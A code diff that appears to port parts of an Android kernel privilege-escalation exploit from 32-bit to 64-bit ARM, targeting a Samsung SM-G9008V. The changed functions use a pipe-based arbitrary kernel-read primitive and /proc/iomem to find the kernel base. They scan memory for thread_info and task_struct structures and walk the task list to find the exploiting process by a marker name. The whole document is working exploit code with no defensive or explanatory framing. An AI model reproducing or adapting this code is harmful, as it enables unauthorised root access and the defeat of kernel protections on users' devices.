@@ -13,21 +13,20 @@
 
 #define PF_KTHREAD	0x00200000	/* I am a kernel thread */
 
-static void *kernel_base = NULL;
+static unsigned long const kernel_start = 0xFFFFFFC000080000;
+static unsigned long kernel_base = 0;
 static int task_struct_comm_offset = 0;
 static int task_struct_tasks_offset = 0; // default is 0x1D0 for SM-G9008V
-static void *kernel_task_struct = NULL;
-static void *current_task_struct = NULL;
-static char *new_comm = "pvR_timewQ";
-static void *sysram = NULL;
+static unsigned long kernel_task_struct = NULL;
+static unsigned long current_task_struct = NULL;
+static const char * const new_comm = "pvR_timewQ";
+static unsigned long sysram = NULL;
 
-struct thread_info
-{
-	unsigned long flags;
-	int preempt_count;
-	unsigned long addr_limit;
-	void *task;
-	void *exec_domain;
+struct thread_info {
+	unsigned long		flags;		/* low level flags */
+	unsigned long		addr_limit;	/* address limit */
+	unsigned long		task;		/* main task structure */
+	unsigned long		exec_domain;	/* execution domain */
 	/* ... */
 };
 
@@ -70,7 +69,7 @@ static int read_iomem() {
 
 	iomem_file = fopen("/proc/iomem", "rt");
 	if(iomem_file == NULL) {
-		kernel_base = (void*)0xC0008000;
+		kernel_base = kernel_start;
 		return 1;
 	}
 
@@ -82,17 +81,17 @@ static int read_iomem() {
 				continue;
 			}
 
-			if(sysram == NULL) {
+			if(sysram == 0) {
 				if(strcasecmp(desc0, "System") == 0
 					&& strcasecmp(desc1, "RAM") == 0) {
-					sysram = (void*)iomem_end;
+					sysram = iomem_end;
 				}
 			}
 
 			if(strcasecmp(desc0, "Kernel") == 0 &&
 				(strcasecmp(desc1, "text") == 0 || strcasecmp(desc1, "code") == 0)) {
-				kernel_base = (void*)((iomem_end+0x2000)&(~(0x2000L-1)));
-				kernel_base += 0xC0000000;
+				kernel_base = ((iomem_end+0x4000)&(~(0x4000UL-1))) - 0x80000000;
+				kernel_base += 0xFFFFFFC000000000;
 				printf("task search start address is 0x%016lX\n", (uint64_t)kernel_base);
 				fclose(iomem_file);
 				return 0;
@@ -112,7 +111,7 @@ int init_utils64() {
 }
 
 static int locate_task_struct_comm_offset() {
-	int task_struct_length = 1000;
+	int task_struct_length = 4000;
 	int i = 0;
 	char *comm_ptr = NULL;
 	uint32_t comm0 = 0;
@@ -152,15 +151,14 @@ static int locate_task_struct_comm_offset() {
 }
 
 static int locate_task_struct_tasks_offset() {
-	int task_struct_length = 1000;
+	int task_struct_length = 4000;
 	int i = 0;
-	uint32_t kernel_start = 0xC0008000;
 	char *comm_ptr = NULL;
-	uint32_t kptr0 = 0;
-	uint32_t kptr1 = 0;
-	uint32_t kmagic = 0;
-	uint32_t kptr2 = 0;
-	uint32_t kptr3 = 0;
+	unsigned long kptr0 = 0;
+	unsigned long kptr1 = 0;
+	int kmagic = 0;
+	unsigned long kptr2 = 0;
+	unsigned long kptr3 = 0;
 
 	for(i=0;i<task_struct_length;i+=4) {
 		comm_ptr = i + (char*)kernel_task_struct;
@@ -171,28 +169,28 @@ static int locate_task_struct_tasks_offset() {
 			continue;
 		}
 
-		if(0!=read_at_address_pipe(comm_ptr+4, &kptr1, sizeof(kptr1))) {
+		if(0!=read_at_address_pipe(comm_ptr+8, &kptr1, sizeof(kptr1))) {
 			continue;
 		}
 		if(kptr1 < kernel_start) {
 			continue;
 		}
 
-		if(0!=read_at_address_pipe(comm_ptr+8, &kmagic, sizeof(kmagic))) {
+		if(0!=read_at_address_pipe(comm_ptr+16, &kmagic, sizeof(kmagic))) {
 			continue;
 		}
 		if(kmagic != 0x0000008c) {
 			continue;
 		}
 
-		if(0!=read_at_address_pipe(comm_ptr+12, &kptr2, sizeof(kptr2))) {
+		if(0!=read_at_address_pipe(comm_ptr+24, &kptr2, sizeof(kptr2))) {
 			continue;
 		}
 		if(kptr2 < kernel_start) {
 			continue;
 		}
 
-		if(0!=read_at_address_pipe(comm_ptr+16, &kptr3, sizeof(kptr3))) {
+		if(0!=read_at_address_pipe(comm_ptr+32, &kptr3, sizeof(kptr3))) {
 			continue;
 		}
 		if(kptr3 < kernel_start) {
@@ -211,12 +209,12 @@ static int locate_current_task_struct() {
 	int total_tasks = 1000;
 	int i = 0;
 	char task_comm[16] = { 0 };
-	char *next_task_struct = kernel_task_struct;
+	char *next_task_struct = (char*)kernel_task_struct;
 	char *task_struct_comm = NULL;
 	char *next = NULL;
 
 	for(i=0;i<total_tasks;i++) {
-		if(0!=read_at_address_pipe(next_task_struct+task_struct_tasks_offset+4, &next, 4)) {
+		if(0!=read_at_address_pipe(next_task_struct+task_struct_tasks_offset+8, &next, 8)) {
 			return 1;
 		}
 		next -= task_struct_tasks_offset;
@@ -243,8 +241,8 @@ static int locate_current_task_struct() {
 		task_comm[15] = '\0';
 
 		if(strcmp(task_comm, new_comm) == 0) {
-			current_task_struct = (void*)next_task_struct;
-			printf("current task_struct at 0x%016lX\n", (uint64_t)current_task_struct);
+			current_task_struct = (unsigned long)next_task_struct;
+			printf("current task_struct at 0x%016lX\n", current_task_struct);
 			return 0;
 		}
 	}
@@ -254,35 +252,35 @@ static int locate_current_task_struct() {
 
 int new_search_task64() {
 	struct thread_info *ti = NULL;
-	int threadinfo_size = 0x2000;
-	int search_times = 0x6000;
+	int threadinfo_size = 0x4000;
+	int search_length = 0xC000000;
 	int i = 0;
 	unsigned long addr_limit = -1;
-	void *exec_domain = 0;
+	unsigned long exec_domain = 0;
 
 	struct task_struct_first_partial *task_first = NULL;
 	int usage = 0;
 	unsigned int flags = 0;
 	void *stack = 0;
 
-	for(i=0; i<search_times; i++) {
-		ti = (void*)(i*threadinfo_size + (char*)kernel_base);
+	for(i=0; i<search_length; i+=threadinfo_size) {
+		ti = (void*)(i + kernel_base);
 		if(0!=read_at_address_pipe(&ti->addr_limit, &addr_limit, sizeof(addr_limit))) {
 			continue;
 		}
-		if(0!=addr_limit) {
+		if(-1UL==addr_limit) {
 			continue;
 		}
 		if(0!=read_at_address_pipe(&ti->exec_domain, &exec_domain, sizeof(exec_domain))) {
 			continue;
 		}
-		if((uint64_t)exec_domain < (uint64_t)kernel_base) {
+		if(exec_domain < kernel_start) {
 			continue;
 		}
 		if(0!=read_at_address_pipe(&ti->task, &task_first, sizeof(task_first))) {
 			continue;
 		}
-		if((uint64_t)task_first < (uint64_t)kernel_base) {
+		if((unsigned long)task_first < kernel_start) {
 			continue;
 		}
 		if(0!=read_at_address_pipe(&task_first->usage, &usage, sizeof(usage))) {
@@ -300,11 +298,11 @@ int new_search_task64() {
 		if(0!=read_at_address_pipe(&task_first->stack, &stack, sizeof(stack))) {
 			continue;
 		}
-		if((uint64_t)stack != (uint64_t)ti) {
+		if(stack != ti) {
 			continue;
 		}
-		kernel_task_struct = (void*)task_first;
-		printf("kernel task_struct at 0x%016lX\n", (uint64_t)kernel_task_struct);
+		kernel_task_struct = (unsigned long)task_first;
+		printf("kernel task_struct at 0x%016lX\n", kernel_task_struct);
 		if(locate_task_struct_comm_offset() != 0) {
 			continue;
 		}
@@ -320,6 +318,6 @@ int new_search_task64() {
 	return 1;
 }
 
-void *get_task_struct64() {
+unsigned long get_task_struct64() {
 	return current_task_struct;
 }
